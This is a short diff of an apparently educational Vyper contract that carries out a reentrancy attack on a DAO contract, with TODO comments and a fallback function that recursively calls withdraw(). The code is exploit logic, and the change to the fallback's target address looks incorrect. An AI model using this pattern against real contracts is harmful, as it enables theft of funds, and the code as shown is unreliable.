@@ -29,7 +29,7 @@ def attack(dao_address:address):
     if dao_address.balance < msg.value:
         deposit_amount = dao_address.balance
     # TODO: make the deposit into the DAO  
-    DAO(self.owner_address).deposit()
+    DAO(self.dao_address).deposit()
     # TODO: Start the reentrancy attack
     DAO(self.dao_address).withdraw()
         # dao_address.balance = dao_address.balance + deposit_amount
@@ -44,4 +44,4 @@ def attack(dao_address:address):
 def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
     # TODO: Add code here to complete the recursive call
-    DAO(self.dao_address).withdraw()
+    DAO(self.owner_address).withdraw()
